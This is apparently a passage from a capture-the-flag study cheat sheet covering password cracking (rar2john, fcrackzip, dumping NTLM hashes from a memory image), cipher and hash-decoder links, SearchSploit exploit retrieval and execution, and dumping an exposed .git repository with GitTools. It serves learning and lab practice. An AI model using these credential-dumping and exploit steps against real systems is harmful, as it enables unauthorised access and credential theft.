<p class="c3"><span class="c2"></span></p><ul class="c8 lst-kix_list_43-0 start"><li class="c0 li-bullet-0"><span class="c9">Rar2John (For .zip files, see Zip2John above)</span></li></ul><ul class="c8 lst-kix_list_44-0 start"><li class="c0 li-bullet-0"><span class="c11"><a class="c6" href="https://www.google.com/url?q=https://www.doyler.net/security-not-included/crack-rar-files-hashcat&amp;sa=D&amp;source=editors&amp;ust=1699590511428037&amp;usg=AOvVaw040Yvw2oFnIlTW0aQyv5P6">https://www.doyler.net/security-not-included/crack-rar-files-hashcat</a></span></li><li class="c0 li-bullet-0"><span class="c13"><a class="c6" href="https://www.google.com/url?q=https://resources.infosecinstitute.com/topics/hacking/hashcat-tutorial-beginners&amp;sa=D&amp;source=editors&amp;ust=1699590511428451&amp;usg=AOvVaw29-ArbMnIy0YgxLiWDJAXf">https://resources.infosecinstitute.com/topics/hacking/hashcat-tutorial-beginners</a></span></li></ul><p class="c3"><span class="c2"></span></p><p class="c4"><span class="c17">Example:</span></p><p class="c3"><span class="c2"></span></p><p class="c4"><span class="c9">1. rar2john encrypted &gt;hash</span></p><p class="c3"><span class="c9"></span></p><p class="c4"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 308.00px; height: 105.00px;"><img alt="" src="images/image146.png" style="width: 308.00px; height: 105.00px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c3"><span class="c9"></span></p>
</details>
 <br>




<details markdown>
  <br>
    <summary>[Password Cracking - Windows NTLM Hashes</summary>
<ul class="c8 lst-kix_list_40-0 start"><li class="c0 li-bullet-0"><span class="c9">Cracking Windows NTLM Hashes:</span></li></ul><p class="c3"><span class="c9"></span></p><ol class="c8 lst-kix_list_41-0 start" start="1"><li class="c0 li-bullet-0"><span class="c9">Dump the Windows password hashes:</span></li></ol><p class="c4"><span class="c2">&#9484;&#9472;&#9472;(root&#12927;kali)-[/home/kali/Desktop/volatility3]</span></p><p class="c4"><span class="c2">&#9492;&#9472;# python3 vol.py -f &#39;/home/kali/Desktop/mem.raw&#39; windows.hashdump.Hashdump &gt;/home/kali/Desktop/Hashes.txt</span></p><p class="c3"><span class="c9"></span></p><ol class="c8 lst-kix_list_41-0" start="2"><li class="c0 li-bullet-0"><span class="c9">Paste the NTLM hash into CrackStation.net.</span></li></ol><p class="c3"><span class="c9"></span></p>
</details>
 <br>




<details markdown>
  <br>
    <summary>[Password Cracking - FCrackZip (Credit to <a href="https://www.linkedin.com/in/tawon-saetang">Tawon Saetang</a> for introducing me to this tool!]</summary>
<ul class="c8 lst-kix_list_37-0"><li class="c0 li-bullet-0"><span class="c9">Fcrackzip</span></li></ul><p class="c4"><span class="c2">If you don&rsquo;t use the &ndash;u switch, FCrackZip will give you a list of possible passwords, but if you use &ndash;u, it&rsquo;s my understanding that the &ndash;u stands for &ldquo;unzip&rdquo; and it takes longer, but if used, will first try to unzip the encrypted file using the possible passwords, and only give you the actual password, if it finds it, instead of a list of possible passwords.</span></p><p class="c3"><span class="c2"></span></p><p class="c4"><span class="c2">See the two examples compared below, the first example does not use the -u switch:</span></p><p class="c3"><span class="c2"></span></p><p class="c4"><span class="c2">&#9484;&#9472;&#9472;(root&#12927;kali)-[/home/kali/Desktop/ToCrack]</span></p><p class="c4"><span class="c2">&#9492;&#9472;# fcrackzip -b --method 2 -D -p /usr/share/john/rockyou.txt /home/kali/Desktop/ToCrack/test.zip</span></p><p class="c3"><span class="c1"></span></p><p class="c4"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 713.13px; height: 208.00px;"><img alt="" src="images/image142.png" style="width: 713.13px; height: 208.00px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c4"><span class="c2">And the following example does use the -u switch, see the difference?</span></p><p class="c4"><span class="c2">&#9484;&#9472;&#9472;(root&#12927;kali)-[/home/kali/Desktop/ToCrack]</span></p><p class="c4"><span class="c2">&#9492;&#9472;# fcrackzip -u -D -p /usr/share/john/rockyou.txt /home/kali/Desktop/ToCrack/f0007474_ore.zip</span></p><p class="c3"><span class="c2"></span></p><p class="c4"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 708.00px; height: 138.60px;"><img alt="" src="images/image144.png" style="width: 708.00px; height: 138.60px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><ul class="c8 lst-kix_list_42-0 start"><li class="c0 li-bullet-0"><span class="c11"><a class="c6" href="https://www.google.com/url?q=https://www.youtube.com/watch?v%3D7f2130_MuZE%26ab_channel%3DMotasemHamdan&amp;sa=D&amp;source=editors&amp;ust=1699590511423827&amp;usg=AOvVaw1nCbkOP8tvOd9SC5YDKk9-">https://www.youtube.com/watch?v=7f2130_MuZE&amp;ab_channel=MotasemHamdan</a></span></li><li class="c0 li-bullet-0"><span class="c2">(5 1/2 minutes in): &nbsp;</span><span class="c11"><a class="c6" href="https://www.google.com/url?q=https://www.youtube.com/watch?v%3D7f2130_MuZE&amp;sa=D&amp;source=editors&amp;ust=1699590511424343&amp;usg=AOvVaw3IC5Zf3A1JaZblwpyhreVK">https://www.youtube.com/watch?v=7f2130_MuZE</a></span></li><li class="c0 li-bullet-0"><span class="c11"><a class="c6" href="https://www.google.com/url?q=https://www.youtube.com/watch?v%3D4IqarU1Q60s&amp;sa=D&amp;source=editors&amp;ust=1699590511424697&amp;usg=AOvVaw0fgH5Lq5At2T5wAik3K42q">https://www.youtube.com/watch?v=4IqarU1Q60s</a></span></li><li class="c0 li-bullet-0"><span class="c11"><a class="c6" href="https://www.google.com/url?q=https://www.kali.org/tools/fcrackzip&amp;sa=D&amp;source=editors&amp;ust=1699590511425042&amp;usg=AOvVaw3QK_IjJ9QSc6IQ0pzGFgtj">https://www.kali.org/tools/fcrackzip</a></span></li><li class="c0 li-bullet-0"><span class="c11"><a class="c6" href="https://www.google.com/url?q=https://github.com/foreni-packages/fcrackzip&amp;sa=D&amp;source=editors&amp;ust=1699590511425366&amp;usg=AOvVaw1aaAnn9-IZExlf3_ZpMBDI">https://github.com/foreni-packages/fcrackzip</a></span></li><li class="c0 li-bullet-0"><span class="c11"><a class="c6" href="https://www.google.com/url?q=http://oldhome.schmorp.de/marc/fcrackzip.html&amp;sa=D&amp;source=editors&amp;ust=1699590511425694&amp;usg=AOvVaw1NfOVPgqD-f60bOUN4bHAC">http://oldhome.schmorp.de/marc/fcrackzip.html</a></span></li><li class="c0 li-bullet-0"><span class="c11"><a class="c6" href="https://www.google.com/url?q=https://www.geeksforgeeks.org/fcrackzip-tool-crack-a-zip-file-password-in-kali-linux&amp;sa=D&amp;source=editors&amp;ust=1699590511426062&amp;usg=AOvVaw3AY4luncqXGMRVZMWFwynF">https://www.geeksforgeeks.org/fcrackzip-tool-crack-a-zip-file-password-in-kali-linux</a></span></li><li class="c0 li-bullet-0"><span class="c11"><a class="c6" href="https://www.google.com/url?q=https://manpages.ubuntu.com/manpages/trusty/man1/fcrackzip.1.html&amp;sa=D&amp;source=editors&amp;ust=1699590511426415&amp;usg=AOvVaw2bc0wuiLOfsETi4ILy7VvI">https://manpages.ubuntu.com/manpages/trusty/man1/fcrackzip.1.html</a></span></li><li class="c0 li-bullet-0"><span class="c11"><a class="c6" href="https://www.google.com/url?q=https://www.hackingarticles.in/comprehensive-guide-on-fcrackzip-tool&amp;sa=D&amp;source=editors&amp;ust=1699590511426755&amp;usg=AOvVaw03UxfZeRupDEMK2hyIruH0">https://www.hackingarticles.in/comprehensive-guide-on-fcrackzip-tool</a></span></li><li class="c0 li-bullet-0"><span class="c11"><a class="c6" href="https://www.google.com/url?q=https://infosecwriteups.com/beginners-ctf-guide-finding-hidden-data-in-images-e3be9e34ae0d&amp;sa=D&amp;source=editors&amp;ust=1699590511427132&amp;usg=AOvVaw34lbIrGwI9X_dSYiyw6Tb6">https://infosecwriteups.com/beginners-ctf-guide-finding-hidden-data-in-images-e3be9e34ae0d</a></span></li><li class="c0 li-bullet-0"><span class="c11"><a class="c6" href="https://www.google.com/url?q=https://www.tenorshare.com/windows-tips/how-to-remove-password-from-zip-file-without-any-software.html&amp;sa=D&amp;source=editors&amp;ust=1699590511427561&amp;usg=AOvVaw2h_zw11G14MEvMs0F0V3Go">https://www.tenorshare.com/windows-tips/how-to-remove-password-from-zip-file-without-any-software.html</a></span></li></ul>
</details>
 <br>




<details markdown>
  <br>
    <summary>[Password Cracking - Encryption/Cipher/Decode Help]</summary>
<p class="c3 c5"><span class="c1"></span></p><ul class="c8 lst-kix_list_47-0 start"><li class="c0 li-bullet-0"><span class="c9">Encryption/Cipher/Decode Help:</span></li></ul><ul class="c8 lst-kix_list_48-0 start"><li class="c0 li-bullet-0"><span class="c11"><a class="c6" href="https://www.google.com/url?q=https://www.geeksforgeeks.org/playfair-cipher-with-examples&amp;sa=D&amp;source=editors&amp;ust=1699590511430066&amp;usg=AOvVaw1oSt4scyWQv9nj9W4BZDAW">https://www.geeksforgeeks.org/playfair-cipher-with-examples</a></span></li><li class="c0 li-bullet-0"><span class="c11"><a class="c6" href="https://www.google.com/url?q=https://gchq.github.io/CyberChef&amp;sa=D&amp;source=editors&amp;ust=1699590511430571&amp;usg=AOvVaw3hW81jWQ-ug-rE5x636iVY">https://gchq.github.io/CyberChef</a></span></li><li class="c0 li-bullet-0"><span class="c11"><a class="c6" href="https://www.google.com/url?q=https://www.dcode.fr/cipher-identifier&amp;sa=D&amp;source=editors&amp;ust=1699590511430962&amp;usg=AOvVaw262H8rtPFxbCuw8D7BGjA0">https://www.dcode.fr/cipher-identifier</a></span></li><li class="c0 li-bullet-0"><span class="c11"><a class="c6" href="https://www.google.com/url?q=https://quipqiup.com/&amp;sa=D&amp;source=editors&amp;ust=1699590511431270&amp;usg=AOvVaw066M0uie-F5uObhkN7Ggqq">https://quipqiup.com</a></span></li><li class="c0 li-bullet-0"><span class="c11"><a class="c6" href="https://www.google.com/url?q=http://rumkin.com/tools/cipher&amp;sa=D&amp;source=editors&amp;ust=1699590511431583&amp;usg=AOvVaw1Bf-IiNqmCm2sd_U-WoWQA">http://rumkin.com/tools/cipher</a></span></li><li class="c0 li-bullet-0"><span class="c11"><a class="c6" href="https://www.google.com/url?q=https://www.boxentriq.com/code-breaking/playfair-cipher&amp;sa=D&amp;source=editors&amp;ust=1699590511431950&amp;usg=AOvVaw2dNw6DbIRE-djid1gAlUMx">https://www.boxentriq.com/code-breaking/playfair-cipher</a></span></li><li class="c0 li-bullet-0"><span class="c11"><a class="c6" href="https://www.google.com/url?q=https://calcoolator.eu/playfair-cipher-encoder-decoder-&amp;sa=D&amp;source=editors&amp;ust=1699590511432281&amp;usg=AOvVaw1AHUfBCWnKNESuvgec0Mjn">https://calcoolator.eu/playfair-cipher-encoder-decoder-</a></span></li><li class="c0 li-bullet-0"><span class="c11"><a class="c6" href="https://www.google.com/url?q=https://cryptii.com/pipes/bacon-cipher&amp;sa=D&amp;source=editors&amp;ust=1699590511432602&amp;usg=AOvVaw08ab-tvsW1HGc2vEMQZ3Pf">https://cryptii.com/pipes/bacon-cipher</a></span></li><li class="c0 li-bullet-0"><span class="c11"><a class="c6" href="https://www.google.com/url?q=https://mothereff.in/bacon&amp;sa=D&amp;source=editors&amp;ust=1699590511433166&amp;usg=AOvVaw3hdg_BiteHpUsgGhVyKATf">https://mothereff.in/bacon</a></span></li><li class="c0 li-bullet-0"><span class="c11"><a class="c6" href="https://www.google.com/url?q=https://www.rapidtables.com/web/tools/index.html&amp;sa=D&amp;source=editors&amp;ust=1699590511433562&amp;usg=AOvVaw2tDZ7rCKNkkhuk4q20oLtu">https://www.rapidtables.com/web/tools/index.html</a></span></li><li class="c0 li-bullet-0"><span class="c11"><a class="c6" href="https://www.google.com/url?q=https://toolbox.googleapps.com/apps/encode_decode&amp;sa=D&amp;source=editors&amp;ust=1699590511433922&amp;usg=AOvVaw0BjL9kUozigCg3Nk1yl9Pp">https://toolbox.googleapps.com/apps/encode_decode</a></span></li><li class="c0 li-bullet-0"><span class="c11"><a class="c6" href="https://www.google.com/url?q=http://www.caesum.com/&amp;sa=D&amp;source=editors&amp;ust=1699590511434246&amp;usg=AOvVaw0LSIb0Pwj2aawzg0-VHyx8">http://www.caesum.com</a></span></li><li class="c0 li-bullet-0"><span class="c11"><a class="c6" href="https://www.google.com/url?q=https://wiremask.eu/tools/xor-cracker&amp;sa=D&amp;source=editors&amp;ust=1699590511434655&amp;usg=AOvVaw1FGOdULbA5f4xxLUorAX5u">https://wiremask.eu/tools/xor-cracker</a></span></li><li class="c0 li-bullet-0"><span class="c11"><a class="c6" href="https://www.google.com/url?q=https://www.browserling.com/tools/xor-decrypt&amp;sa=D&amp;source=editors&amp;ust=1699590511435011&amp;usg=AOvVaw1uwL2Qut-gsDlcmsP9IMBj">https://www.browserling.com/tools/xor-decrypt</a></span></li><li class="c0 li-bullet-0"><span class="c11"><a class="c6" href="https://www.google.com/url?q=https://onlinecryptotools.com/&amp;sa=D&amp;source=editors&amp;ust=1699590511435373&amp;usg=AOvVaw2qirByWVC_dtszu8O6dZGa">https://onlinecryptotools.com</a></span></li><li class="c0 li-bullet-0"><span class="c2">Web Token Decoder: </span><span class="c11"><a class="c6" href="https://www.google.com/url?q=https://jwt.io/&amp;sa=D&amp;source=editors&amp;ust=1699590511435745&amp;usg=AOvVaw22SUlCCCHD4MQYyUphQ8Ne">https://JWT.io</a></span></li></ul>

<p class="c3"><span class="c2"></span></p><p class="c4"><span class="c2">Credit to <a href="https://noahheckman.carrd.co">Noah Heckman at BHIS</a> for the below clue using this as an example: p!hh3b_1b_o_nkf0</span></p><p class="c4"><span class="c2">Underscores can be indicative of a flag. &nbsp;Also, not a lot of encryptions will use an underscore, so when you see those, you pretty much know it&rsquo;s going to be encoding in play. &nbsp;And furthermore, you could even pretty much guess that a single digit denotes an &ldquo;a&rdquo; or an &ldquo;i&rdquo; if in fact the string is going to be decoded into English. &nbsp;Cryptographic Analysis can come in handy here using linguistics such as frequency analysis like common two-letter words, frequency of letters, etc.</span></p>
</details>
<br>




<details markdown>
  <br>
    <summary>[Password Cracking - Hash Reversing/Hash Decoders]</summary>
<p class="c3"><span class="c2"></span></p><ul class="c8 lst-kix_list_47-0"><li class="c0 li-bullet-0"><span class="c9">Hash Reversing/Hash Decoders:</span></li></ul><ul class="c8 lst-kix_list_49-0 start"><li class="c0 li-bullet-0"><span class="c11"><a class="c6" href="https://www.google.com/url?q=https://crackstation.net/&amp;sa=D&amp;source=editors&amp;ust=1699590511436372&amp;usg=AOvVaw17vd0wNCZ5_Jw2qzk9cTi2">https://crackstation.net</a></span></li><li class="c0 li-bullet-0"><span class="c11"><a class="c6" href="https://www.google.com/url?q=https://md5hashing.net/hash&amp;sa=D&amp;source=editors&amp;ust=1699590511436762&amp;usg=AOvVaw10nE8Di2iHllzOKSenRToh">https://md5hashing.net/hash</a></span></li><li class="c0 li-bullet-0"><span class="c11"><a class="c6" href="https://www.google.com/url?q=https://hashtoolkit.com/&amp;sa=D&amp;source=editors&amp;ust=1699590511437083&amp;usg=AOvVaw1OUlj_JJjvdZf8VnDGS7jL">https://hashtoolkit.com</a></span></li><li class="c0 li-bullet-0"><span class="c11"><a class="c6" href="https://www.google.com/url?q=https://md5.gromweb.com/&amp;sa=D&amp;source=editors&amp;ust=1699590511437408&amp;usg=AOvVaw1DXyJZLnx8kYkqUgtnj7iG">https://md5.gromweb.com</a></span></li></ul><p class="c3"><span class="c2"></span></p>
</details>
</details>
<br>




<details markdown>
  <br>
  <summary>[PDF Analysis]</summary>
<details markdown>
  <br>
    <summary>[PDF Analysis - PDF Editors]</summary>
<a href="https://www.sejda.com/pdf-editor" target="_blank">https://www.sejda.com/pdf-editor</a><br><br>
</details>



<details markdown>
  <br>
    <summary>[PDF Analysis - thunar and atril]</summary>
The thunar and atril commands appear to yield the same result, each opening-up the Atril PDF Reader.<br><br>
thunar Command:<br><br>
<img src="images/image228.png"><br><br>
atril Command:<br><br>
<img src="images/image227.png"><br><br>
atril PDF Viewer:<br><br>
<img src="images/image230.png"><br><br>
</details>
</details>
<br>
  



<details>
<summary>[Misc.]</summary>
<ul>
  <li><B>Bubble Sort:</B></li>
<ul class="c8 lst-kix_list_93-0 start"><li class="c0 c5 li-bullet-0"><span class="c2">In the off-chance that you come across a challenge which uses Bubble Sort, I found this to be a good guide:</span></li>
<a href="https://linuxhint.com/bubble-sort-algorithm" target="_blank">https://linuxhint.com/bubble-sort-algorithm</a><br><br>
</ul>
  


<ul>
  <li><B>Split Screen Terminal Emulator - tmux:</B></li>
<ul class="c8 lst-kix_list_93-0 start"><li class="c0 c5 li-bullet-0"><span class="c2">The folowing resources were useful to me around tmux:</span></li>
<a href="https://www.youtube.com/watch?v=Lqehvpe_djs" target="_blank">https://www.youtube.com/watch?v=Lqehvpe_djs</a><br>
<a href="https://medium.com/@jeongwhanchoi/install-tmux-on-osx-and-basics-commands-for-beginners-be22520fd95e" target="_blank">https://medium.com/@jeongwhanchoi/install-tmux-on-osx-and-basics-commands-for-beginners-be22520fd95e</a><br><br>
</ul>



<ul>
  <li><B>RHOST vs. LHOST:</B></li>
<ul class="c8 lst-kix_list_93-0 start"><li class="c0 c5 li-bullet-0"><span class="c2">I found these helpful for RHOST vs. LHOST and Port 4444 vs. Port 5555 in case anyone else finds it useful:</span></li>
<a href="https://github.com/rapid7/metasploit-framework/issues/6505" target="_blank">https://github.com/rapid7/metasploit-framework/issues/6505</a><br>
<a href="https://www.reddit.com/r/metasploit/comments/sz5oly/the_meaning_of_lhost_and_rhost" target="_blank">https://www.reddit.com/r/metasploit/comments/sz5oly/the_meaning_of_lhost_and_rhost</a><br><br>
</ul>




<ul>
  <li><B>SearchSploit:</B></li>
<ul class="c8 lst-kix_list_93-0 start"><li class="c0 c5 li-bullet-0"><span class="c2">SearchSploit is a tool which can be used to search the exploits listed on ExploitDB.</span></li><li class="c0 c5 li-bullet-0"><span class="c2">First, you can search for the item that you are researching:</span></li></ul><p class="c3 c5"><span class="c19"></span></p><p class="c4 c5"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 713.00px; height: 224.33px;"><img alt="" src="images/image176.png" style="width: 713.00px; height: 224.33px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><ul class="c8 lst-kix_list_94-0 start"><li class="c0 c5 li-bullet-0"><span class="c1">After your initial SearchSploit query, you can pick from the results and choose to dig a bit further by using the &ldquo;x&rdquo; (Examine) switch. Below is an unrelated example:</span></li></ul><p class="c4 c5"><span class="c1">Searchsploit &ndash;x 49933.py</span></p><p class="c4 c5"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 298.00px; height: 41.00px;"><img alt="" src="images/image174.jpg" style="width: 298.00px; height: 41.00px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><ul class="c8 lst-kix_list_95-0 start"><li class="c0 c5 li-bullet-0"><span class="c1">Next, we can use the &ldquo;m&rdquo; switch to Mirror it:</span></li></ul><p class="c4 c5"><span class="c1">Searchsploit &ndash;m 49933.py</span></p><p class="c3 c5"><span class="c1"></span></p><p class="c4 c5"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 480.00px; height: 213.00px;"><img alt="" src="images/image180.jpg" style="width: 480.00px; height: 213.00px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c3 c5"><span class="c1"></span></p><ul class="c8 lst-kix_list_96-0 start"><li class="c0 c5 li-bullet-0"><span class="c1">A file named 49933.py will be dropped into your working directory, which is basically that exploit.</span></li></ul><p class="c4 c5"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 77.00px; height: 81.00px;"><img alt="" src="images/image178.jpg" style="width: 77.00px; height: 81.00px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c3 c5"><span class="c1"></span></p><ul class="c8 lst-kix_list_97-0 start"><li class="c0 c5 li-bullet-0"><span class="c1">Now, let&#39;s run that Python file that was just dropped.</span></li><li class="c0 c5 li-bullet-0"><span class="c1">You will be prompted for the host URL, and then if you&rsquo;re lucky, you&rsquo;ll get a shell:</span></li></ul><p class="c4 c5"><span class="c1">python3 49933.py</span></p><p class="c3 c5"><span class="c1"></span></p><p class="c4 c5"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 403.00px; height: 140.00px;"><img alt="" src="images/image171.jpg" style="width: 403.00px; height: 140.00px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c3 c5"><span class="c2"></span></li></ul>






</li>
</ul>
<ul>
  <li><B>GitDumper</B></li>
<ul class="c8 lst-kix_list_98-0 start"><li class="c0 c5 li-bullet-0"><span class="c11"><a class="c6" href="https://www.google.com/url?q=https://github.com/arthaud/git-dumper&amp;sa=D&amp;source=editors&amp;ust=1699590511496042&amp;usg=AOvVaw3xAe-XPwtJQI1sneAMFK_r">https://github.com/arthaud/git-dumper</a></span></li></ul><ul class="c8 lst-kix_list_99-0 start"><li class="c0 c5 li-bullet-0"><span class="c2">A tool to dump a git repository from a website.</span></li></ul><p class="c3 c5"><span class="c2"></span></li></ul>






</li>
</ul>
<ul>
  <li><B>GitTools</B></li>
<ul class="c8 lst-kix_list_100-0 start"><li class="c0 c5 li-bullet-0"><span class="c11"><a class="c6" href="https://www.google.com/url?q=https://github.com/internetwache/GitTools&amp;sa=D&amp;source=editors&amp;ust=1699590511496686&amp;usg=AOvVaw2hldt_pG_Ry5BOM5TskE6H">https://github.com/internetwache/GitTools</a></span></li></ul><ul class="c8 lst-kix_list_101-0 start"><li class="c0 c5 li-bullet-0"><span class="c2">You can use this tool to find websites with their .git repository available to the public.</span></li><li class="c0 c5 li-bullet-0"><span class="c2">GitTools is pretty simple to use, just grab the URL from the GitHub rep:</span></li></ul><p class="c3 c5"><span class="c2"></span></p><p class="c4 c5"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 679.20px; height: 333.93px;"><img alt="" src="images/image170.png" style="width: 679.20px; height: 333.93px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><ul class="c8 lst-kix_list_102-0 start"><li class="c0 c5 li-bullet-0"><span class="c1">Then you can run it (I created a folder called &ldquo;Dumped&rdquo; for the results):</span></li></ul><p class="c4 c5"><span class="c2">&#9484;&#9472;&#9472;(kali&#12927;kali)-[~/Desktop/GitTools/Dumper]</span></p><p class="c4 c5"><span class="c2">&#9492;&#9472;$ ./gitdumper.sh http://10.10.60.113/.git/ ~/GitHappens/Dumped</span></p><p class="c4 c5"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 615.00px; height: 53.80px;"><img alt="" src="images/image173.jpg" style="width: 615.00px; height: 53.80px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><ul class="c8 lst-kix_list_103-0 start"><li class="c0 c5 li-bullet-0"><span class="c2">Next, cd into that &quot;Dumped&quot; folder:</span></li></ul><p class="c4 c5"><span class="c2">&#9484;&#9472;&#9472;(kali&#12927;kali)-[~/GitHappens]</span></p><p class="c4 c5"><span class="c2">&#9492;&#9472;$ cd Dumped &nbsp; &nbsp;</span></p><p class="c4 c5"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 472.00px; height: 202.27px;"><img alt="" src="images/image172.jpg" style="width: 472.00px; height: 202.27px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span><span class="c2">&nbsp;</span></p><ul class="c8 lst-kix_list_104-0 start"><li class="c0 c5 li-bullet-0"><span class="c2">Run &quot;ls -lah&quot; to view the newly created .git directory:</span></li></ul><p class="c4 c5"><span class="c2">&#9484;&#9472;&#9472;(kali&#12927;kali)-[~/GitHappens/Dumped]</span></p><p class="c4 c5"><span class="c2">&#9492;&#9472;$ ls &ndash;lah</span></p><p class="c4 c5"></span></p>


<ul class="c8 lst-kix_list_105-0 start"><li class="c0 c5 li-bullet-0"><span class="c2">cd into that .git folder:</span></li></ul><p class="c4 c5"><span class="c2">&#9484;&#9472;&#9472;(kali&#12927;kali)-[~/GitHappens/Dumped]</span></p><p class="c4 c5"><span class="c2">&#9492;&#9472;$ cd .git &nbsp;</span></p><p class="c4 c5"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 315.00px; height: 48.00px;"><img alt="" src="images/image126.jpg" style="width: 315.00px; height: 48.00px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c3 c5"><span class="c2"></span></p><ul class="c8 lst-kix_list_106-0 start"><li class="c0 c5 li-bullet-0"><span class="c2">Run &quot;ls -lah&quot; to view the contents of the newly created .git directory:</span></li></ul><p class="c4 c5"><span class="c2">&#9484;&#9472;&#9472;(kali&#12927;kali)-[~/GitHappens/Dumped/.git]</span></p><p class="c4 c5"><span class="c2">&#9492;&#9472;$ ls -lah</span></p><p class="c4 c5"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 451.00px; height: 281.00px;"><img alt="" src="images/image131.jpg" style="width: 451.00px; height: 281.00px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c3 c5"><span class="c1"></span></p><ul class="c8 lst-kix_list_107-0 start"><li class="c0 c5 li-bullet-0"><span class="c1">Now you can run &ldquo;git log&rdquo; to view the contents of the logs:</span></li></ul><p class="c4 c5"><span class="c33">Note: To back out, you can just type the letter q:</span></p><p class="c3 c5"><span class="c1"></span></p><p class="c4 c5"><span class="c1">&#9484;&#9472;&#9472;(kali&#12927;kali)-[~/GitHappens/Dumped/.git]</span></p><p class="c4 c5"><span class="c1">&#9492;&#9472;$ git log</span></p><p class="c4 c5"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 345.00px; height: 37.00px;"><img alt="" src="images/image129.jpg" style="width: 345.00px; height: 37.00px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c3 c5"><span class="c1"></span></p><ul class="c8 lst-kix_list_108-0 start"><li class="c0 c5 li-bullet-0"><span class="c1">Each commit has its own unique identifier and if you see a commit you want to display, you can just use, &ldquo;git show &lt;commit id&gt;</span></li></ul><p class="c4 c5"><span class="c33">Note: To back out, you can just type the letter q:</span></p><p class="c3 c5"><span class="c1"></span></p><p class="c4 c5"><span class="c1">&#9484;&#9472;&#9472;(kali&#12927;kali)-[~/GitHappens/Dumped/.git]</span></p><p class="c4 c5"><span class="c1">&#9492;&#9472;$ git show 2eb93ac3534155069a8ef59cb25b9c1971d5d199</span></p><p class="c4 c5"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 440.00px; height: 49.00px;"><img alt="" src="images/image119.jpg" style="width: 440.00px; height: 49.00px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); 